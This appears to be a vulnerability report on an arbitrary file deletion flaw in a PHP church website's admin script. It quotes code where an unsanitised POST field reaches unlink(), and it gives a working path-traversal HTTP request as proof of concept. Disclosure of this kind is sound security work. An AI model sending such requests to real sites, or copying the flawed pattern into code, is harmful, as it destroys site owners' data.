### Vulnerability file address

In line 295 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photo4_img']);`,` $_POST['old_photo4_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['photo4']['tmp_name'] != '') {
            $img4 = generateUniqueFilename($_FILES['photo4']);
            $filepath = "../../assets/images/" . $img4;

            if (move_uploaded_file($_FILES["photo4"]["tmp_name"], $filepath)) {
                @unlink("../../assets/images/" . $_POST['old_photo4_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 374

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update5"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo4_img"

../../11.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo4";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `11.txt` file in the `church/` directory

![image-20250505155724965](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051557021.png)



Then we execute the above poc to attack

![image-20250505155811825](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051558855.png)



Files are deleted after the attack is successful

![image-20250505160326536](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051603574.png)